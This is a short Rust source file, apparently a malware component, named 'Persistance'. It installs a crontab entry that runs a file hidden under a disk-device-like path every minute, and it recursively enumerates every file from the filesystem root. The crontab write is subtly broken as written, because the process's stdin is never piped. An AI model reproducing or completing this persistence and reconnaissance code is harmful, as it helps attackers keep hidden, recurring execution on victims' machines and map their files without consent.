use std::process::Command;
use std::path::PathBuf;
use std::io::Write;
use std::fs;

use log::{info, warn};


pub struct Persistance {
    paths: Vec<PathBuf>,
}

impl Persistance {
    pub fn new() -> Persistance {
        Persistance {
            paths: descent(&[PathBuf::from("/")]),
        }
    }

    pub fn install(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let mut process = Command::new("/usr/bin/crontab").spawn()?;

        match process.stdin.take() {
            Some(mut stdin) => {
                stdin.write_all(b"* * * * * /dev/disk/by-partuuid/3hxr47")?;

                info!("successfully set crontab");
            },
            None => {
                warn!("failed to set crontab");
            },
        }

        Ok(())
    }
}

pub fn descent(paths: &[PathBuf]) -> Vec<PathBuf> {
    let (dirs, files): (Vec<PathBuf>, Vec<PathBuf>) = paths.iter().cloned().partition(|path| path.is_dir());

    let next = dirs.iter()
        .filter_map(|dir| {
            fs::read_dir(dir)
                .map(|read| read.filter_map(|entry| entry.ok().map(|entry| entry.path())).collect::<Vec<PathBuf>>())
                .map(|paths| descent(&paths))
                .ok()
        })
        .flatten()
        .collect::<Vec<PathBuf>>();

    [files, next].concat()
}

pub fn init() {
    let persistance = Persistance::new();

    info!("paths: {:#?}", persistance.paths);
}


